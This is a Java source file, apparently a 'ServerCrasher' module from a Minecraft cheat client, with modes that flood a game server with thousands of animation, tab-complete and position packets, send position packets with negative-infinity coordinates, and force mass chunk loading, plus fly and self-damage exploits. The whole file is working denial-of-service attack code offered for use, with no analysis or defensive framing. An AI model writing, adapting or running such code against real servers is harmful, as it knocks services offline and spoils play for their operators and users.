package cn.snowflake.rose.mod.mods.WORLD;


import cn.snowflake.rose.events.impl.EventMotion;
import cn.snowflake.rose.events.impl.EventUpdate;
import cn.snowflake.rose.mod.Category;
import cn.snowflake.rose.mod.Module;
import cn.snowflake.rose.utils.Value;
import com.darkmagician6.eventapi.EventTarget;


import net.minecraft.network.play.client.*;

public class ServerCrasher extends Module {
    public Value<String> mode = new Value<String>("ServerCrasher_Mode", "Mode",0);

    private boolean speedTick;
    private double yVal;
    double health;
    boolean hasDamaged = false;
    boolean hasJumped = false;
    double posY = 0.0D;

    public ServerCrasher() {
        super("ServerCrasher","Server Crasher", Category.WORLD);
        this.mode.addValue("C0Animotion");
        this.mode.addValue("C14TabComplete");
        this.mode.addValue("AACnew");
        this.mode.addValue("AACold");
        this.mode.addValue("massivechunkloading");
        this.mode.addValue("Slowly");
        this.mode.addValue("Fly");

    }


    public void onEnable() {
//		if (this.isEnabled()) {
        if (mode.isCurrentMode("AACnew")) {
            for (int index = 0; index < 9999; ++index)
                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + 9412 * index, mc.thePlayer.boundingBox.minY, mc.thePlayer.boundingBox.minY + 9412 * index, mc.thePlayer.posZ + 9412 * index, true));
        }
        if (mode.isCurrentMode("AACold")) {
            mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(Double.NEGATIVE_INFINITY, mc.thePlayer.boundingBox.minY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
        }
        if (mode.isCurrentMode("C0Animotion")){
            for (int i = 0; i < (1337 * 5); i++) {
                this.setDisplayName("Packet :" + i);
                mc.thePlayer.sendQueue.addToSendQueue(new C0APacketAnimation());
            }
        }
        if (mode.isCurrentMode("C14TabComplete")){
            for (int i = 0; i < (1337 * 5); i++) {
                this.setDisplayName("Packet :" + i);
                mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete("/"));
            }
        }
        if (mode.isCurrentMode("massive_chunkloading")) {
            for (double yPos = mc.thePlayer.posY; yPos < 255; yPos += 5) {
                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX, mc.thePlayer.boundingBox.minY, yPos, mc.thePlayer.posZ, true));
            }
            for (int i = 0; i < (1337 * 5); i += 5) {
                this.setDisplayName("Packet :" + i);
                mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(mc.thePlayer.posX + i, mc.thePlayer.boundingBox.minY, 255, mc.thePlayer.posZ + i, true));
            }
        }
//		}
    }

    public void onDisable() {
        this.mc.thePlayer.capabilities.allowFlying = false;
    }

    @EventTarget
    public void OnUpdate(EventUpdate e) {

        if(mode.isCurrentMode("Slowly")) {
            if (this.hasJumped) {
                this.mc.thePlayer.motionY = 0.0D;
            }

            for(int i = 0; i < 50; ++i) {
                if (!(this.hasDamaged = (double)((int)this.mc.thePlayer.getHealth()) < this.health)) {
                    this.damage();
                }

                this.health = (double)this.mc.thePlayer.getHealth();
                if (!this.hasJumped) {
                    this.hasJumped = true;
                    this.mc.thePlayer.motionY = 0.3D;
                }
            }
        }


        if(mode.isCurrentMode("Fly")) {
            double x;
            double playerY;
            double y;
            double playerZ;
            double z;
            int i;
            double playerX = mc.thePlayer.posX;
            playerY = mc.thePlayer.posY;
            playerZ = mc.thePlayer.posZ;
            y = 0.0;
            x = 0.0;
            z = 0.0;
            i = 0;

            while (i < 200) {
                y = i * 9;
                mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y,mc.thePlayer.rotationYaw,playerZ, false));
                ++i;
            }

            i = 0;

            while (i < 10000) {
                z = i * 9;
                mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(playerX, playerY + y,mc.thePlayer.rotationYaw,playerZ + z, false));
                ++i;
            }
        }
    }
    @EventTarget
    public void onPreMovePlayer(EventMotion event) {
        if (this.speedTick) {
            event.y *= 1.0E-13D;
            double movementMultiplier = (double)this.mc.thePlayer.capabilities.getFlySpeed() * 20.0D;
            this.mc.thePlayer.fallDistance = 0.0F;
            this.mc.thePlayer.onGround = true;
        }
    }

    private void damage() {
        for(int i = 0; i < 70; ++i) {
            this.mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(this.mc.thePlayer.posX,mc.thePlayer.boundingBox.minY ,this.mc.thePlayer.posY + 0.06D, this.mc.thePlayer.posZ, false));
            this.mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(this.mc.thePlayer.posX, mc.thePlayer.boundingBox.minY ,this.mc.thePlayer.posY, this.mc.thePlayer.posZ, false));
        }
        this.mc.thePlayer.sendQueue.addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(this.mc.thePlayer.posX, mc.thePlayer.boundingBox.minY ,this.mc.thePlayer.posY + 0.1D, this.mc.thePlayer.posZ, false));
    }

}

